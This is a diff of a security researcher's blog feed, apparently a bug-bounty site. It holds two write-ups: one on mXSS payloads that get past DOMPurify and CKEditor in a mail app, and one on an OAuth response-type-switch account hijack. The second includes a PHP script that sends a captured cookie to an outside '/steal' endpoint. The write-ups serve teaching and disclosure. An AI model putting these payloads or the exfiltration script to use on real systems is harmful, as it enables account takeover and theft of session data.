+<p>This allowed me to get XSS in the local environment which I setup, upon testing the same vector in the Redacted Mail application it didn’t workkk the payload was breaking here and there. This meant my local setup is not exactly same as what’s on the target. I investigated further and concluded that they were doing something like this, I was dealing with minified js so it was hell to figure out exactly what they were doing.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">clean</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">dirty</span><span class="p">)</span>
+<span class="nx">f</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">DOMParser</span><span class="p">).</span><span class="nf">parseFromString</span><span class="p">(</span><span class="nx">clean</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">)</span>
+<span class="nx">e</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span>
+</code></pre></div></div>
+
+<p>I spent a few more days on fixing the payload but it was getting broken at one point or another there was something more going on behind the scenes as well. As nothing was working for me, I decided to re-shift my goal and asked myself can I smuggle the same CKEditor payload without using the nested DOMPurify bypass? I thought if I can find some mutation for the CDATA payload where DOMPurify sees it differently and considers it safe compared to CKEditor which has a different parsing rule compared to DOMPurify.</p>
+
+<iframe style="width:100%; height:500px; border:1px solid #333; border-radius:8px;" sandbox="allow-scripts allow-modals allow-popups allow-same-origin" src="https://yeswehack.github.io/Dom-Explorer/frame?input=editable&amp;titleBar=readonly&amp;readonly=true&amp;pipe[titleBar]=true&amp;pipe[settings]=true&amp;pipe[render]=true&amp;pipe[skip]=true#eyJpbnB1dCI6InNoaXJsZXkgPHN0eWxlPiBhYWE8IDwvc3R5bGU+XG48c3R5bGUgaWQ9XCJyZW1vdmVkXCI+IDxhIDwvc3R5bGU+XG48c3R5bGUgaWQ9XCJyZW1vdmVkXCI+IDwxIDwvc3R5bGU+IiwicGlwZWxpbmVzIjpbeyJpZCI6IjVwam5hMXRvIiwibmFtZSI6IkRvbSBUcmVlIiwicGlwZXMiOlt7Im5hbWUiOiJEb21QdXJpZnkiLCJpZCI6IjhqcWJjaG5jIiwiaGlkZSI6ZmFsc2UsInNraXAiOmZhbHNlLCJvcHRzIjp7InZlcnNpb24iOiIzLjEuNSIsIm9wdGlvbnMiOiJ7fSIsImhvb2tzIjoiZnVuY3Rpb24oZG9tUHVyaWZ5KXsgXG4gIGRvbVB1cmlmeS5yZW1vdmVBbGxIb29rcygpXG4gIC8vIC4uLlxufSJ9fV19XX0="></iframe>
+
+<p><img alt="image" src="/assets/images/mxss/11.png" /></p>
+
+<p><br /></p>
+
+<p>DOMPurify has the following code to deal around with this where upon detecting any possible starting tags or closing ones it would remove that element itself.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">const</span> <span class="nx">_sanitizeElements</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">currentNode</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">content</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="p">...</span>
+    <span class="p">...</span>
+
+    <span class="cm">/* Detect mXSS attempts abusing namespace confusion */</span>
+    <span class="k">if </span><span class="p">(</span>
+      <span class="nx">currentNode</span><span class="p">.</span><span class="nf">hasChildNodes</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
+      <span class="o">!</span><span class="nf">_isNode</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">firstElementChild</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+      <span class="nf">regExpTest</span><span class="p">(</span><span class="sr">/&lt;</span><span class="se">[/\w]</span><span class="sr">/g</span><span class="p">,</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+      <span class="nf">regExpTest</span><span class="p">(</span><span class="sr">/&lt;</span><span class="se">[/\w]</span><span class="sr">/g</span><span class="p">,</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">textContent</span><span class="p">)</span>
+    <span class="p">)</span> <span class="p">{</span>
+      <span class="nf">_forceRemove</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">);</span>
+      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>But worry not again luck is on our side, <code class="language-plaintext highlighter-rouge">&lt;![CDATA[</code> the starting block of CDATA gets passed through this regex test easily without triggering any alarms.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">shirley</span> <span class="o">&lt;</span><span class="nx">style</span><span class="o">&gt;</span> <span class="o">&lt;!</span><span class="p">[</span><span class="nx">CDATA</span><span class="p">[</span> <span class="o">&lt;</span><span class="sr">/style</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>The same works locally but in the target you can see the difference, in the first iteration itself the content inside of STYLE element is removed.</p>
+
+<p><img alt="image" src="/assets/images/mxss/12.png" /></p>
+
+<p><br /></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">dirty</span>
+<span class="dl">"</span><span class="s2">shirley &lt;style&gt; &lt;![CDATA[ &lt;/style&gt;</span><span class="dl">"</span>
+<span class="nx">serializedHTML</span>
+<span class="dl">"</span><span class="s2">shirley &lt;style&gt;&lt;/style&gt;</span><span class="dl">"</span> 
+</code></pre></div></div>
+
+<p>The culprit for this was the <code class="language-plaintext highlighter-rouge">uponSanitizeElement</code> hook method, which inside uses a CSS sanitizer to ensure users can’t include any sort of arbitrary CSS in mails.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">domPurify</span><span class="p">.</span><span class="nf">addHook</span><span class="p">(</span><span class="dl">"</span><span class="s2">uponSanitizeElement</span><span class="dl">"</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">handleElement</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="k">this</span><span class="p">)),</span>
+
+  <span class="nx">Sanitizer</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">handleElement</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span> <span class="nx">_data</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">element</span> <span class="k">instanceof</span> <span class="nx">HTMLStyleElement</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">cssSanitizer</span><span class="p">.</span><span class="nf">sanitizeStyleElement</span><span class="p">(</span><span class="nx">element</span><span class="p">))</span>
+  <span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>The CSS sanitizer is a full blown CSS parser which goes through all the css rules and their respective values. Bypassing this was very easy, I just needed to include the payload inside of a css rule value. This goes as it is through DOMPurify.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shirley <span class="nt">&lt;style&gt;</span> <span class="nc">.test</span> <span class="p">{</span> <span class="nl">font-family</span><span class="p">:</span> <span class="err">"</span><span class="n">Times</span> <span class="n">New</span> <span class="n">Roman</span> <span class="err">&lt;!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span><span class="err">"</span><span class="p">}</span><span class="nt">&lt;/style&gt;</span>
+</code></pre></div></div>
+
+<p>Coming back to the original payload for CKEditor</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;style&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span><span class="nt">h1</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span><span class="nt">&lt;/style&gt;</span> // [1]
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span> aaaaaaaaaaaaaaaaaaaaaaa // [2]
+<span class="nt">&lt;style&gt;</span> <span class="err">}</span><span class="o">]]&gt;</span> <span class="nt">&lt;/style&gt;</span> // [3]
+</code></pre></div></div>
+
+<p>For [1] I can use <code class="language-plaintext highlighter-rouge">&lt;style&gt; .test { font-family: "Times New Roman &lt;![CDATA["}&lt;/style&gt;</code>
+For [3] the css sanitizer will convert it to <code class="language-plaintext highlighter-rouge">&lt;style&gt;&lt;/style&gt;</code>
+For [2] DOMPurify parser will easily see the image onerror vector it would be sanitized to <code class="language-plaintext highlighter-rouge">&lt;img src=x&gt;</code></p>
+
+<p>Remember that DOMPurify doesn’t allow you to include any tags inside of it (regex check) so the only possible way for me to hide my payload [2] would be inside an attribute value otherwise it will always be sanitized and same for the <code class="language-plaintext highlighter-rouge">&lt;/style&gt;</code> I can’t include it anywhere else the only possible place where I can put an extra closing style tag is inside the attribute value that too only because of the hooks forceKeepAttr misconfiguration.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"tel:&lt;/style&gt;&lt;img src=x onerror=alert()&gt;"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>This was the payload I came up with to bypass both DOMPurify and CKEditor, the payload appears safe so DOMPurify lets it pass but when parsed by CKEditor it’s a different story</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shirley<span class="nt">&lt;style&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span><span class="nt">h1</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span><span class="nt">&lt;/style&gt;</span>  <span class="nt">&lt;svg&gt;&lt;style&gt;</span><span class="o">&lt;</span><span class="nt">a</span> <span class="nt">href</span><span class="o">=</span><span class="err">"</span><span class="nt">tel</span><span class="o">:</span><span class="nt">&lt;/style&gt;&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>"&gt;<span class="nt">&lt;/style&gt;&lt;/svg&gt;</span> <span class="nt">&lt;svg&gt;&lt;style&gt;</span><span class="err">}</span><span class="o">]]&gt;</span><span class="nt">&lt;/style&gt;&lt;/svg&gt;</span>
+</code></pre></div></div>
+
+<p>DOMPurify sees</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shirley
+<span class="nt">&lt;style&gt;</span><span class="o">&lt;![</span><span class="nt">CDATA</span><span class="o">[</span><span class="nt">h1</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span><span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;svg&gt;</span>
+  <span class="nt">&lt;style&gt;</span>
+    <span class="o">&lt;</span><span class="nt">a</span> <span class="nt">href</span><span class="o">=</span><span class="err">"</span><span class="nt">tel</span><span class="o">:</span><span class="nt">&lt;/style&gt;&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>"&gt;
+  <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/svg&gt;</span> 
+<span class="nt">&lt;svg&gt;</span>
+ <span class="nt">&lt;style&gt;</span>
+   <span class="err">}</span><span class="o">]]&gt;</span>
+ <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/svg&gt;</span>
+</code></pre></div></div>
+
+<p>And this is how it gets parsed and rendered by CKEditor</p>
+
+<p><img alt="image" src="/assets/images/mxss/13.png" /></p>
+
+<p><br /></p>
+
+<p>Finally some tweaks were needed to make it work on the real target and in the end this is how it looked like</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaaa<span class="nt">&lt;style&gt;</span> <span class="nc">.custom-text</span><span class="nd">::before</span> <span class="p">{</span> <span class="nl">font-family</span><span class="p">:</span> <span class="err">"</span><span class="n">Times</span> <span class="n">New</span> <span class="n">Roman</span> <span class="err">&lt;!</span><span class="p">[</span><span class="n">CDATA</span><span class="p">[</span><span class="n">h1</span> <span class="err">{</span> <span class="n">color</span><span class="p">:</span> <span class="no">red</span><span class="p">;</span> <span class="err">",</span> <span class="err">serif;</span> <span class="p">}</span><span class="nt">&lt;/style&gt;&lt;svg&gt;&lt;style&gt;</span><span class="o">&lt;</span><span class="nt">a</span> <span class="nt">href</span><span class="o">=</span><span class="err">"</span><span class="nt">tel</span><span class="o">:</span><span class="nt">&lt;/style&gt;&lt;img</span> <span class="na">src=</span><span class="s">x</span> <span class="na">onerror=</span><span class="s">alert()</span><span class="nt">&gt;</span>aaaaaaaaaaaaa"&gt;<span class="nt">&lt;/style&gt;&lt;/svg&gt;</span> <span class="nt">&lt;svg&gt;&lt;style&gt;</span><span class="err">}</span><span class="o">]]&gt;</span> <span class="nt">&lt;/style&gt;</span> <span class="nt">&lt;/svg&gt;</span>
+</code></pre></div></div>
+
+<hr />
+
+<p>When the DOMPurify bypasses came out, mxss was something which I was really scared of and couldn’t really wrap my head around it. If you call yourself a client side lover, MXSS is something which you should have a good grasp on so I had no other choice but to get good at it.</p>
+
+<p>I spent way too long on DOMPurify in order to reverse engineer the poc, iirc the DOMPurify bypasses were only disclosed publicly after a year the advisory came out. I still remember I used to debug DOMPurify source line by line just to understand how it works, reading RFCs, reading all previous mxss related findings and trying to find those on your own just to get a feel for how they were discovered in the first place.</p>
+
+<p>If I hadn’t spent that time on mxss I would have never found this xss bug in the mail application. Mxss payloads aren’t something which you can build blindly unless you know what you are doing you need understanding of the basics how html is parsed and serialized everything from the ground up.</p>
+
+<p>I will also share some resources if you are interested in learning about MXSS.</p>
+
+<p>This is absolute the best content out there for anyone who wants to get started with XSS, <a href="https://x.com/SecurityMB">Michał Bentkowski</a> explains things so well I watched this video like 2-3 times</p>
+
+<iframe width="100%" height="450" style="max-width:800px;" src="https://www.youtube.com/embed/QBkLI35sxVs?si=b78BW0Sr2fxsKTEg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+
+<p><br /></p>
+
+<p>This video from LiveOverflow still gives me goosebumps</p>
+
+<iframe width="100%" height="450" style="max-width:800px;" src="https://www.youtube.com/embed/lG7U3fuNw3A?si=yst2AoFYR2K8_bLB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+
+<p><br /></p>
+
+<p>I got my final hint for the DOMPurify bypass by watching S1r1us’s video only otherwise I don’t think I would have been able to come up with the poc in time before the public disclosures were made.</p>
+
+<iframe width="100%" height="450" style="max-width:800px;" src="https://www.youtube.com/embed/vVwo5tW6d3w?si=MVd2qnLV8juXXwUr" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+
+<p><br /></p>
+
+<p>Before wrapping up this blogpost, mxss is cool right? But guess what the above payloads you saw wouldn’t actually work now, due to a spec change which was adopted by all major browsers.</p>
+
+<p>This spec was pushed by none other than SecurityMB, the same person who once started all this by finding those DOMPurify bypasses in the early era put a nail in the coffin :p</p>
+
+<p><a href="https://github.com/whatwg/html/issues/6235">https://github.com/whatwg/html/issues/6235</a></p>
+
+<p>If you want to test the payloads yourself, they should work on the latest version of Firefox and Chromium. Due to the above spec changes, the <code class="language-plaintext highlighter-rouge">--disable-features=EscapeLtGtInAttributes</code> startup flag is required for Chrome, and in Firefox set <code class="language-plaintext highlighter-rouge">dom.security.html_serialization_escape_lt_gt=false</code> in <code class="language-plaintext highlighter-rouge">about:config</code> (this check should say “does NOT escape”) and you should be good to go.</p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><category term="bugbounty" /><category term="xss" /><category term="mxss" /><category term="dompurify" /><category term="ckeditor" /><summary type="html"><![CDATA[Heyy Everyonee, I wanted to write about this bug for quite a long time because it’s one of my best xss findings, the time and effort it took to pull this off was immense. Additionally this program doesn’t allow any form of disclosure so sadly there will be no screenshots plus majority of the stuff you will see will be in redacted form.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/mxss/1.png" /><media:content medium="image" url="http://localhost:4000/assets/images/mxss/1.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Abusing the NinjaShell API for Code Execution in Google Web Designer</title><link href="http://localhost:4000/2025/09/23/RCE-in-web-designer.html" rel="alternate" type="text/html" title="Abusing the NinjaShell API for Code Execution in Google Web Designer" /><published>2025-09-23T00:00:00+05:30</published><updated>2025-09-23T00:00:00+05:30</updated><id>http://localhost:4000/2025/09/23/RCE-in-web-designer</id><content type="html" xml:base="http://localhost:4000/2025/09/23/RCE-in-web-designer.html"><![CDATA[<p>Heyyy Everyone,</p>
 
 <p><em>Google Web Designer</em> has been on my radar for quite some time because of this person: <a href="https://balintmagyar.com">https://balintmagyar.com</a>
 . He has been finding so many cool RCEs in this single desktop application, which made me so interested to look into it and try to find one myself.</p>
@@ -3545,236 +4266,4 @@ https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897</p>
 
 <p>The program was really happy with the report, although their maximum payout was 3k they still paid this 4.5k for this bug</p>
 
-<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/b501f9f9-57f4-4138-8984-23ea6e981ec9" alt="image" /></p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.]]></summary></entry><entry><title type="html">Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com</title><link href="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html" rel="alternate" type="text/html" title="Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com" /><published>2023-09-10T00:00:00+05:30</published><updated>2023-09-10T00:00:00+05:30</updated><id>http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance</id><content type="html" xml:base="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html"><![CDATA[<p>My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.</p>
-
-<p>Although https://login.redacted.com is really a special domain as it’s used for signup/login , oauth ,etc so there must be a way to do something impactful.</p>
-
-<p>During that time, I remembered about Frans Rosen’s research on Oauth https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ eg: where by changing the response_type from code to code,id_token made the OAuth provider return the oauth token,etc in the hash fragment of the url. If the web server isn’t configured to handle /  expects the oauth token in a query param  it might return an error page and the oauth token may be remain as it is in the hash fragment. (Checkout for more ways to fail the oauth flow)</p>
-
-<p>Now all the attacker needs is a way to steal that oauth token , Frans talked in detail about various ways which could be used for this, even disclosed some of his findings publically.</p>
-
-<p>https://hackerone.com/reports/1567186
-https://gitlab.com/gitlab-org/gitlab/-/issues/362394</p>
-
-<p>Please read the blogpost by Frans Rosen before moving on as everything is explained there in very detail.</p>
-
-<hr />
-
-<p>I clicked on the <code class="language-plaintext highlighter-rouge">Sign in With Google</code> button and it redirect me to this url:</p>
-
-<p>https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?response_type=code&amp;client_id=redacted.apps.googleusercontent.com&amp;redirect_uri=https%3A%2F%2Flogin.redacted.com%2Fservices%2Fauthcallback%2Fgoogle&amp;scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&amp;state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;service=lso&amp;o2v=1&amp;flowName=GeneralOAuthFlow</p>
-
-<p>I changed the <code class="language-plaintext highlighter-rouge">response_type</code> to <code class="language-plaintext highlighter-rouge">response_type=code,id_token</code> and now just went with the oauth flow , I was redirected to this page.</p>
-
-<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;code=4/0Adeu5BUex4YzCBcszdOirTLW_UO0o7O5QXEynHjerek2dUDBLaV2QjPMdkK051x7MOBdzA&amp;scope=email%20profile%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile&amp;id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjgzOGMwNmM2MjA0NmMyZDk000GFmZmUxMzdkZDUzMTAxMjlmNGQ1ZDEiLCJ0eXAiOiJKV1QifQ.xxxxxx.O2OPIsMtZZzUc4v3zHXPBCL5rfjciDfPqQScixbpsSXdEbgsxpxMhcz5M3P01yFaVsAzxyXY2iK9kT6gaul99FmizlBk9tpTfcmHCTSlYKiVz-JTn0LevJHoaRSy8hrH5u5TTLpes3yC2U6pZrdPPQgFZsHFKa8gE2N9-XKK80IKwyftukCjNSNFLhGnJy92h7P4xADUS353R0v8C1WnL8J7Ha7Ic-2lr9xg0AKDoYdTiKqAL7FfSq6rUCDR9pPzmXkud0GA_Ff0h_CuOhD_loXRP8t0F8rsjNdQEHR2RLllmSfZtFS2jjUFr7AAgyZav6fF7Xga_jzNnDyWzriAo4A&amp;authuser=0&amp;prompt=consent&amp;version_info=CmxfU1ZJX0VLU0Vzc2pBbjRFREdCQWlQMDFCUlVSSVpsOXhSRFk0WjJwYWFFUmplamxqUmxOTWVIVjZYeTFtZUZwV2EzQkJhWFZrY0dKd1pIWmFOV2x6WVRocU4yNHlkVGhRYnpGeVZsTkNWUV8</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/identity/sso/ui/AuthorizationError?
-ErrorCode=No_Oauth_State
-&amp;ErrorDescription=State+was+not+sent+back
-&amp;ProviderId=redacted
-#state=CAAAAY&amp;code=4/0Ad...&amp;id_token=eyJh..................
-</code></pre></div></div>
-
-<p>From the <code class="language-plaintext highlighter-rouge">ErrorDescription</code> you can see the server was expecting a state parameter to be there in the query param but as the hash fragment is there and is only accessible via client side js , as they are in the hash fragment the error is shown.</p>
-
-<p>Now all we need is a way to steal the hash fragment.
-As our xss is in the same domain, I can easily read it. All I need is to make some relation between the error page containing code in hash and the xss page.</p>
-
-<hr />
-
-<p>I went ahead and created a poc, which first setups the oauth url with the modified response_type , then opens the xss endpoint in a new tab using javascript’s window.open (we will refer to this tab as winB), then using window.location I redirected the current page to the oauth url (we will refer this as winA).</p>
-
-<p>The oauth flow takes place and the user is redirected to this url (in winA tab)</p>
-
-<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad…&amp;id_token=eyJh………………</p>
-
-<p>See the origin of winA it’s login.redacted.com and the origin of winB is also login.redacted.com. As both winA and winB are of same origin, we can read the full url of winA tab. Using window.opener.document.location.hash property from the winB tab where we have xss, I can easily get the necessary paramater values eg: code . An attacker can send this to his server and then login into victim’s account by just placing the retrieved state and code parameter value in this callback url:</p>
-
-<p>${state} and ${code} are the place holders.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/services/authcallback/google?state=${state}&amp;code=${code}&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none
-</code></pre></div></div>
-
-<p>Now the attacker just needs to make a request to this url and he will be able to login to victim’s account after following the below steps.</p>
-
-<hr />
-
-<p>I wrote the following php script to do the above steps:</p>
-
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-
-<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"https://login.redacted.com/services/auth/sso/google/"</span><span class="p">;</span>
-
-<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
-<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
-<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-
-<span class="c1">// The response of this url contains the oauth url in the Location header and the idccsrf cookie from the Set-Cookie header</span>
-<span class="nv">$response</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> <span class="c1">//[1]</span>
-
-<span class="nv">$header_size</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLINFO_HEADER_SIZE</span><span class="p">);</span>
-<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>
-<span class="nv">$body</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>
-
-<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-
-<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>
-
-<span class="k">foreach</span> <span class="p">(</span><span class="nv">$headers</span> <span class="k">as</span> <span class="nv">$header</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Location: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$location</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span> <span class="c1">//oauth url is stored here</span>
-    <span class="p">}</span>
-
-    <span class="c1"># get set-cookie</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Set-Cookie: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>  <span class="c1">// idccsrf cookie is stored here</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-
-
-<span class="c1">#send this cookie to attacker controlled server https://en2celr7rewbul.m.pipedream.net/steal?q=</span>
-
-<span class="nv">$attackerDomain</span> <span class="o">=</span> <span class="s2">"https://en2celr7oewbxl.m.pipedream.net/steal?q="</span><span class="p">;</span>
-
-<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
-<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$attackerDomain</span> <span class="mf">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">));</span>
-<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-
-<span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> 
-
-
-
